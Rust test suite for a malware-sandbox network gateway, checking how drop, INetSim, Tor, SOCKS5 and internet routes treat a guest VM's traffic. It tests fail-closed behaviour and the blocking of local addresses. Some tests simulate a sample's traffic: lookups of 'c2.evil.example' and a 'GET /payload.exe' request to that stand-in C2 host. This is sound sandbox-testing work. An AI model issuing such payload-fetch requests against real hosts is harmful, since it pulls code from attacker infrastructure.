//! What each route does with a guest's traffic.
use super::{
    DNS, GATEWAY, GUEST, Rig, WAIT, config_for,
    guest::{Connect, DNS_MAC, GATEWAY_MAC, Guest, Tcp, lease_address, lease_options},
    socks_server::{FakeSocks, FarEnd, Options},
};
use crate::route::{InetSimMode, RouteConfig, RouteKind, dns};
use std::{net::Ipv4Addr, time::Duration};

const SHORT: Duration = Duration::from_millis(600);

#[test]
fn the_guest_configures_itself_from_the_gateway_like_qemus_user_network() {
    let mut rig = Rig::new("dhcp");
    let lease = rig.guest.dhcp().expect("a DHCP offer");
    assert_eq!(lease_address(&lease), GUEST);
    let options = lease_options(&lease);
    let option = |code: u8| {
        options
            .iter()
            .find(|(c, _)| *c == code)
            .map(|(_, v)| v.clone())
    };
    assert_eq!(option(3), Some(GATEWAY.octets().to_vec()));
    assert_eq!(option(6), Some(DNS.octets().to_vec()));
    assert_eq!(option(1), Some(vec![255, 255, 255, 0]));
    assert_eq!(rig.guest.arp(GATEWAY), Some(GATEWAY_MAC));
    assert_eq!(rig.guest.arp(DNS), Some(DNS_MAC));
    // Nobody else answers for other addresses.
    assert_eq!(rig.guest.arp(Ipv4Addr::new(10, 0, 2, 99)), None);
}

#[test]
fn a_new_gateway_drops_everything_and_counts_it() {
    let mut rig = Rig::new("drop");
    assert_eq!(rig.gateway.kind(), RouteKind::Drop);
    // DNS gets no answer.
    assert!(rig.guest.dns("evil.example", dns::TYPE_A, SHORT).is_none());
    // A connection attempt is not answered (no RST either: a firewall).
    let (_tcp, state) = Tcp::open(&mut rig.guest, Ipv4Addr::new(93, 184, 216, 34), 80, SHORT);
    assert_eq!(state, Connect::Silent);
    // UDP that is not DNS, and ICMP to a far host.
    rig.guest
        .send_udp(Ipv4Addr::new(8, 8, 8, 8), 4000, 123, b"ntp");
    rig.guest
        .send_ip(Ipv4Addr::new(8, 8, 8, 8), 1, &[8, 0, 0, 0, 0, 1, 0, 1]);
    std::thread::sleep(Duration::from_millis(300));
    let stats = rig.gateway.stats();
    assert_eq!(stats.dns_queries, 1);
    assert_eq!(stats.dns_unanswered, 1);
    assert_eq!(stats.tcp_blocked, 1);
    assert_eq!(stats.tcp_connections, 0);
    assert_eq!(stats.udp_dropped, 1);
    assert_eq!(stats.icmp_dropped, 1);
}

#[test]
fn the_drop_route_claimed_by_a_run_is_the_same_as_none() {
    let mut rig = Rig::new("drop-claim");
    rig.claim("run1", &RouteConfig::default(), RouteKind::Drop)
        .unwrap();
    let (_tcp, state) = Tcp::open(&mut rig.guest, Ipv4Addr::new(1, 1, 1, 1), 443, SHORT);
    assert_eq!(state, Connect::Silent);
    assert!(rig.guest.dns("a.example", dns::TYPE_A, SHORT).is_none());
}

#[test]
fn inetsim_answers_every_name_with_the_sinkhole_and_serves_fake_http() {
    let mut rig = Rig::new("inetsim");
    let config = RouteConfig::default();
    rig.claim("run1", &config, RouteKind::InetSim).unwrap();
    assert_eq!(rig.gateway.kind(), RouteKind::InetSim);
    let sinkhole: Ipv4Addr = config.inetsim.sinkhole.parse().unwrap();
    for name in ["c2.evil.example", "update.microsoft.com"] {
        let answer = rig.guest.dns(name, dns::TYPE_A, WAIT).expect("an answer");
        assert_eq!(Guest::answer_addresses(&answer), vec![sinkhole]);
    }
    // AAAA: the name exists, no such record.
    let aaaa = rig
        .guest
        .dns("c2.evil.example", dns::TYPE_AAAA, WAIT)
        .unwrap();
    assert!(Guest::answer_addresses(&aaaa).is_empty());
    assert_eq!(Guest::rcode(&aaaa), 0);
    // HTTP to the sinkhole and to an address the sample made up.
    for target in [sinkhole, Ipv4Addr::new(8, 8, 8, 8)] {
        let (mut tcp, state) = Tcp::open(&mut rig.guest, target, 80, WAIT);
        assert_eq!(state, Connect::Open);
        tcp.send_all(
            &mut rig.guest,
            b"GET /payload.exe HTTP/1.1\r\nHost: c2.evil.example\r\nConnection: close\r\n\r\n",
        );
        let reply = tcp.read_to_end(&mut rig.guest, WAIT);
        let text = String::from_utf8_lossy(&reply);
        assert!(text.starts_with("HTTP/1.1 200 OK"), "{text}");
        assert!(tcp.fin);
    }
    // SMTP greets, other ports accept and discard.
    let (mut smtp, state) = Tcp::open(&mut rig.guest, sinkhole, 25, WAIT);
    assert_eq!(state, Connect::Open);
    let banner = smtp.read(&mut rig.guest, 4, WAIT);
    assert!(String::from_utf8_lossy(&banner).starts_with("220 "));
    let (mut tls, state) = Tcp::open(&mut rig.guest, sinkhole, 443, WAIT);
    assert_eq!(state, Connect::Open);
    tls.send_all(&mut rig.guest, b"\x16\x03\x01 hello");
    let stats = rig.gateway.stats();
    assert_eq!(stats.tcp_connections, 4);
    assert_eq!(stats.dns_queries, 3);
    assert!(stats.up_len > 0 && stats.down_len > 0);
}

#[test]
fn inetsim_external_sends_connections_to_the_port_plus_the_offset() {
    // A plain listener plays INetSim.
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let real = listener.local_addr().unwrap().port();
    std::thread::spawn(move || {
        use std::io::Write;
        while let Ok((mut stream, _)) = listener.accept() {
            let _ = stream.write_all(b"220 inetsim ready\r\n");
        }
    });
    let mut rig = Rig::new("inetsim-ext");
    let mut config = RouteConfig::default();
    config.inetsim.mode = InetSimMode::External;
    config.inetsim.port_offset = real - 25;
    rig.claim("run1", &config, RouteKind::InetSim).unwrap();
    let (mut tcp, state) = Tcp::open(&mut rig.guest, Ipv4Addr::new(203, 0, 113, 9), 25, WAIT);
    assert_eq!(state, Connect::Open);
    let banner = tcp.read(&mut rig.guest, 5, WAIT);
    assert!(banner.starts_with(b"220 inetsim"));
}

#[test]
fn an_external_inetsim_that_is_not_there_stops_the_run() {
    let rig = Rig::new("inetsim-down");
    let mut config = RouteConfig::default();
    config.inetsim.mode = InetSimMode::External;
    config.inetsim.port_offset = 1;
    let error = rig.claim("run1", &config, RouteKind::InetSim).unwrap_err();
    assert!(error.contains("InetSim is not answering"), "{error}");
    assert_eq!(rig.gateway.kind(), RouteKind::Drop);
}

#[test]
fn tor_gets_the_names_not_the_lookups() {
    let socks = FakeSocks::echo();
    let mut rig = Rig::new("tor");
    rig.claim("run1", &config_for(&socks), RouteKind::Tor)
        .unwrap();
    assert_eq!(rig.gateway.kind(), RouteKind::Tor);
    let answer = rig
        .guest
        .dns("hidden.example.onion", dns::TYPE_A, WAIT)
        .unwrap();
    let addresses = Guest::answer_addresses(&answer);
    assert_eq!(addresses.len(), 1);
    assert_eq!(
        addresses[0].octets()[..2],
        [198, 18],
        "a placeholder address"
    );
    let (mut tcp, state) = Tcp::open(&mut rig.guest, addresses[0], 8080, WAIT);
    assert_eq!(state, Connect::Open);
    tcp.send_all(&mut rig.guest, b"hello through the proxy");
    assert_eq!(
        tcp.read(&mut rig.guest, 23, WAIT),
        b"hello through the proxy"
    );
    // The proxy was given the name, not an address, and no lookup left.
    let requests = socks.requests();
    assert_eq!(requests.len(), 1);
    assert_eq!(
        (
            requests[0].atyp,
            requests[0].host.as_str(),
            requests[0].port
        ),
        (3, "hidden.example.onion", 8080)
    );
    // A connection to a literal address goes as an address.
    let (mut direct, state) = Tcp::open(&mut rig.guest, Ipv4Addr::new(93, 184, 216, 34), 443, WAIT);
    assert_eq!(state, Connect::Open);
    direct.send_all(&mut rig.guest, b"x");
    assert_eq!(direct.read(&mut rig.guest, 1, WAIT), b"x");
    assert_eq!(socks.requests()[1].host, "93.184.216.34");
    assert_eq!(socks.requests()[1].atyp, 1);
    let stats = rig.gateway.stats();
    assert_eq!((stats.tcp_connections, stats.dns_queries), (2, 1));
}

#[test]
fn udp_other_than_dns_is_dropped_and_counted_on_a_proxied_route() {
    let socks = FakeSocks::echo();
    let mut rig = Rig::new("udp");
    rig.claim("run1", &config_for(&socks), RouteKind::Tor)
        .unwrap();
    for port in [123, 443, 5353] {
        rig.guest
            .send_udp(Ipv4Addr::new(9, 9, 9, 9), 4000, port, b"quic?");
    }
    rig.guest
        .send_udp(Ipv4Addr::new(9, 9, 9, 9), 4000, 123, b"ntp");
    std::thread::sleep(Duration::from_millis(300));
    assert_eq!(rig.gateway.stats().udp_dropped, 4);
    assert!(socks.requests().is_empty());
}

#[test]
fn a_proxy_that_refuses_gives_the_guest_a_refused_connection() {
    let socks = FakeSocks::start(
        Options {
            refuse: vec!["blocked.example".into()],
            ..Options::default()
        },
        FarEnd::Echo,
    );
    let mut rig = Rig::new("refuse");
    rig.claim("run1", &config_for(&socks), RouteKind::Tor)
        .unwrap();
    let answer = rig.guest.dns("blocked.example", dns::TYPE_A, WAIT).unwrap();
    let ip = Guest::answer_addresses(&answer)[0];
    let (_tcp, state) = Tcp::open(&mut rig.guest, ip, 80, WAIT);
    assert_eq!(state, Connect::Refused);
    assert_eq!(rig.gateway.stats().tcp_failed, 1);
}

#[test]
fn socks5_logs_in_with_the_saved_credentials() {
    let socks = FakeSocks::start(
        Options {
            login: Some(("analyst".into(), "s3cret".into())),
            ..Options::default()
        },
        FarEnd::Echo,
    );
    let mut rig = Rig::new("login");
    let mut config = config_for(&socks);
    config.socks5.username = "analyst".into();
    config.socks5.password = "s3cret".into();
    rig.claim("run1", &config, RouteKind::Socks5).unwrap();
    let (mut tcp, state) = Tcp::open(&mut rig.guest, Ipv4Addr::new(5, 6, 7, 8), 22, WAIT);
    assert_eq!(state, Connect::Open);
    tcp.send_all(&mut rig.guest, b"ssh");
    assert_eq!(tcp.read(&mut rig.guest, 3, WAIT), b"ssh");
    assert_eq!(
        socks.requests()[0].login,
        Some(("analyst".into(), "s3cret".into()))
    );
}

#[test]
fn wrong_credentials_stop_the_run_before_it_starts() {
    let socks = FakeSocks::start(
        Options {
            login: Some(("analyst".into(), "s3cret".into())),
            ..Options::default()
        },
        FarEnd::Echo,
    );
    let rig = Rig::new("badlogin");
    let mut config = config_for(&socks);
    config.socks5.username = "analyst".into();
    config.socks5.password = "wrong".into();
    let error = rig.claim("run1", &config, RouteKind::Socks5).unwrap_err();
    assert!(
        error.contains("refused the user name and password"),
        "{error}"
    );
    assert!(
        !error.contains("wrong") && !error.contains("s3cret"),
        "{error}"
    );
    assert_eq!(rig.gateway.kind(), RouteKind::Drop);
}

#[test]
fn a_route_that_is_down_fails_closed_and_never_falls_back() {
    // Nothing listens on this port.
    let port = {
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        listener.local_addr().unwrap().port()
    };
    let mut rig = Rig::new("down");
    let mut config = RouteConfig::default();
    config.tor.socks = format!("127.0.0.1:{port}");
    let error = rig.claim("run1", &config, RouteKind::Tor).unwrap_err();
    assert!(
        error.contains("Tor via") || error.contains("not up"),
        "{error}"
    );
    assert_eq!(rig.gateway.kind(), RouteKind::Drop);
    // The failed claim left nothing: traffic is still dropped.
    let (_tcp, state) = Tcp::open(&mut rig.guest, Ipv4Addr::new(1, 1, 1, 1), 80, SHORT);
    assert_eq!(state, Connect::Silent);
    assert!(rig.guest.dns("a.example", dns::TYPE_A, SHORT).is_none());
    // A proxy that hangs up after the greeting is down as well.
    let socks = FakeSocks::start(
        Options {
            hang_up: true,
            ..Options::default()
        },
        FarEnd::Echo,
    );
    assert!(
        rig.claim("run1", &config_for(&socks), RouteKind::Tor)
            .is_err()
    );
    assert_eq!(rig.gateway.kind(), RouteKind::Drop);
}

#[test]
fn the_check_target_is_connected_through_the_route_before_the_run() {
    let socks = FakeSocks::start(
        Options {
            refuse: vec!["bad.example".into()],
            ..Options::default()
        },
        FarEnd::Echo,
    );
    let rig = Rig::new("probe");
    let mut config = config_for(&socks);
    config.tor.probe = "check.example:443".into();
    rig.claim("run1", &config, RouteKind::Tor).unwrap();
    let seen = socks.requests();
    assert_eq!(
        (seen[0].host.as_str(), seen[0].port, seen[0].atyp),
        ("check.example", 443, 3)
    );
    rig.gateway.release("run1");
    config.tor.probe = "bad.example:443".into();
    let error = rig.claim("run2", &config, RouteKind::Tor).unwrap_err();
    assert!(error.contains("is not up"), "{error}");
    assert_eq!(rig.gateway.kind(), RouteKind::Drop);
}

#[test]
fn the_route_ends_with_the_run_and_its_connections_are_reset() {
    let socks = FakeSocks::echo();
    let mut rig = Rig::new("release");
    rig.claim("run1", &config_for(&socks), RouteKind::Tor)
        .unwrap();
    let (mut tcp, state) = Tcp::open(&mut rig.guest, Ipv4Addr::new(5, 6, 7, 8), 80, WAIT);
    assert_eq!(state, Connect::Open);
    rig.gateway.release("run1");
    assert_eq!(rig.gateway.kind(), RouteKind::Drop);
    assert!(
        tcp.wait_reset(&mut rig.guest, WAIT),
        "the old connection is reset"
    );
    // New traffic is dropped again.
    let (_second, state) = Tcp::open(&mut rig.guest, Ipv4Addr::new(5, 6, 7, 8), 80, SHORT);
    assert_eq!(state, Connect::Silent);
}

#[test]
fn runs_that_overlap_share_one_route_and_the_last_one_out_ends_it() {
    let socks = FakeSocks::echo();
    let rig = Rig::new("overlap");
    let config = config_for(&socks);
    rig.claim("run1", &config, RouteKind::Tor).unwrap();
    rig.claim("run2", &config, RouteKind::Tor).unwrap();
    let error = rig.claim("run3", &config, RouteKind::InetSim).unwrap_err();
    assert!(
        error.contains("another run in this VM is using the route"),
        "{error}"
    );
    assert_eq!(rig.gateway.kind(), RouteKind::Tor);
    rig.gateway.release("run1");
    assert_eq!(rig.gateway.kind(), RouteKind::Tor);
    rig.gateway.release("run2");
    assert_eq!(rig.gateway.kind(), RouteKind::Drop);
    rig.claim("run3", &config, RouteKind::InetSim).unwrap();
}

#[test]
fn a_large_transfer_both_ways_arrives_intact() {
    let upload: Vec<u8> = (0..400_000u32).map(|n| (n % 253) as u8).collect();
    let socks = FakeSocks::echo();
    let mut rig = Rig::new("bulk");
    rig.claim("run1", &config_for(&socks), RouteKind::Socks5)
        .unwrap();
    let (mut tcp, state) = Tcp::open(&mut rig.guest, Ipv4Addr::new(5, 6, 7, 8), 9000, WAIT);
    assert_eq!(state, Connect::Open);
    // The echo sends it all back while it is still being sent.
    tcp.send_all(&mut rig.guest, &upload);
    let echoed = tcp.read(&mut rig.guest, upload.len(), Duration::from_secs(30));
    assert_eq!(echoed.len(), upload.len());
    assert!(echoed == upload, "echoed bytes differ");
    assert!(rig.gateway.stats().up_len >= upload.len() as u64);
}

#[test]
fn a_download_larger_than_the_window_and_a_clean_close() {
    let socks = FakeSocks::start(Options::default(), FarEnd::Flood(500_000));
    let mut rig = Rig::new("flood");
    rig.claim("run1", &config_for(&socks), RouteKind::Tor)
        .unwrap();
    let (mut tcp, state) = Tcp::open(&mut rig.guest, Ipv4Addr::new(5, 6, 7, 8), 80, WAIT);
    assert_eq!(state, Connect::Open);
    tcp.send_all(&mut rig.guest, b"go");
    let body = tcp.read_to_end(&mut rig.guest, Duration::from_secs(30));
    assert_eq!(body.len(), 500_000);
    assert!(body.iter().enumerate().all(|(n, b)| *b == (n % 251) as u8));
    assert!(tcp.fin);
    tcp.close(&mut rig.guest);
}

#[test]
fn the_internet_route_answers_dns_from_the_host_and_never_reaches_the_host_itself() {
    let mut rig = Rig::new("internet");
    rig.claim("run1", &RouteConfig::default(), RouteKind::Internet)
        .unwrap();
    // `localhost` resolves from the hosts file: no network involved.
    let answer = rig.guest.dns("localhost", dns::TYPE_A, WAIT).unwrap();
    assert_eq!(Guest::answer_addresses(&answer), vec![Ipv4Addr::LOCALHOST]);
    let before = rig.gateway.stats();
    // Connections to the gateway, the guest's network, loopback and a
    // private network are refused without any connection being made.
    for target in [
        GATEWAY,
        Ipv4Addr::new(10, 0, 2, 40),
        Ipv4Addr::LOCALHOST,
        Ipv4Addr::new(192, 168, 1, 1),
        Ipv4Addr::new(169, 254, 169, 254),
        Ipv4Addr::new(198, 18, 5, 5),
    ] {
        let (_tcp, state) = Tcp::open(&mut rig.guest, target, 80, WAIT);
        assert_eq!(state, Connect::Refused, "{target}");
    }
    let after = rig.gateway.stats();
    assert_eq!(after.tcp_blocked - before.tcp_blocked, 6);
    assert_eq!(after.tcp_connections, 0);
    assert_eq!(after.tcp_failed, 0);
}

#[test]
fn nothing_but_the_proxy_is_ever_dialed_on_a_proxied_route() {
    // A private destination goes to the proxy as an address, like any other,
    // because the proxy decides what it can reach; a loopback one is refused
    // here since it can only mean this computer.
    let socks = FakeSocks::echo();
    let mut rig = Rig::new("proxy-dest");
    rig.claim("run1", &config_for(&socks), RouteKind::Tor)
        .unwrap();
    let (_tcp, state) = Tcp::open(&mut rig.guest, Ipv4Addr::LOCALHOST, 22, WAIT);
    assert_eq!(state, Connect::Refused);
    let (_tcp, state) = Tcp::open(&mut rig.guest, GATEWAY, 22, WAIT);
    assert_eq!(state, Connect::Refused);
    assert!(socks.requests().is_empty());
}
